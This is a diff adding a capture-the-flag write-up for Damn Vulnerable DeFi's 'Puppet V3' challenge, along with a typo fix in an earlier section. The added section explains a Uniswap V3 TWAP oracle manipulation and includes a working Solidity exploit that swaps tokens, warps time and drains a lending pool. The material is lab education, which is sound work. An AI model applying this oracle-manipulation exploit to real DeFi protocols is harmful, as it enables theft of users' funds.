@@ -991,7 +991,7 @@ Attack flow:
 
 ## 12. Climber   
 
-### Chalange Overview   
+### Challenge Overview   
 
 There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).    
 The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.    
@@ -1299,4 +1299,99 @@ Attack flow:
             address(0), 
             signatures
         );
+    }   
+
+## 14. Puppet V3
+
+### Challenge Overview
+
+Bear or bull market, true DeFi devs keep building. Remember that lending pool you helped? A new version is out. 
+They’re now using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.  
+The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.    
+Starting with 1 ETH and some DVT, you must save all from the vulnerable lending pool. Don't forget to send them to the designated recovery account. 
+_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._  
+
+### Vulnerability Analysis
+
+The Puppet V3 challenge exposes a price oracle manipulation vulnerability despite upgrading to Uniswap V3's time-weighted average price (TWAP) mechanism. The lending pool now uses Uniswap V3 and a time-based oracle, but critical vulnerabilities remain.
+The core vulnerability lies in the _getOracleQuote() function within the PuppetV3Pool contract: 
+
+    function _getOracleQuote(uint128 amount) private view returns (uint256) {
+        (int24 arithmeticMeanTick,) = OracleLibrary.consult({
+            pool: address(uniswapV3Pool), 
+            secondsAgo: TWAP_PERIOD
+        });
+        return OracleLibrary.getQuoteAtTick({
+            tick: arithmeticMeanTick,
+            baseAmount: amount,
+            baseToken: address(token),
+            quoteToken: address(weth)
+        });
+    }   
+
+This implementation is vulnerable for several reasons:  
+
+1. Short TWAP period: The 10-minute (600 seconds) time window is insufficient for protection against manipulation   
+2. Insufficient liquidity: The Uniswap V3 pool only has 100 WETH and 100 DVT    
+3. Concentrated liquidity range: The pool's liquidity is concentrated in a narrow price range, explicitly defined in the setup:     
+
+    positionManager.mint(
+        INonfungiblePositionManager.MintParams({
+            token0: token0,
+            token1: token1,
+            tickLower: -60,  // Narrow liquidity range lower bound
+            tickUpper: 60,   // Narrow liquidity range upper bound
+            fee: FEE,
+            recipient: deployer,
+            amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
+            amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
+            amount0Min: 0,
+            amount1Min: 0,
+            deadline: block.timestamp
+        })
+    );  
+
+4. No circuit breakers: The oracle blindly trusts the Uniswap V3 TWAP without any validation or maximum price deviation checks  
+
+Attack flow:    
+
+1. Swap a large amount of DVT tokens (110 DVT) for WETH through Uniswap V3  
+2. This pushes the price outside the concentrated liquidity range (ticks -60 to +60), causing a catastrophic price collapse to extreme negative tick values (-887272)   
+3. Wait approximately 114 seconds to maximize the TWAP manipulation while staying within the time limit 
+4. The manipulated TWAP makes DVT appear extremely devalued compared to WETH (99.995% price reduction)  
+5. Convert ETH to WETH for collateral   
+6. Calculate the now minimal required collateral (reduced from 3,000,000 WETH to just 0.143 WETH)   
+7. Approve and deposit this minimal WETH as collateral  
+8. Borrow the entire DVT balance (1,000,000 tokens) from the lending pool   
+9. Transfer all tokens to the recovery address  
+
+### Solution
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_puppetV3() public checkSolvedByPlayer {
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        uint256 wethRequiredBefore = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        vm.warp(block.timestamp + 114 seconds);
+        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), wethRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
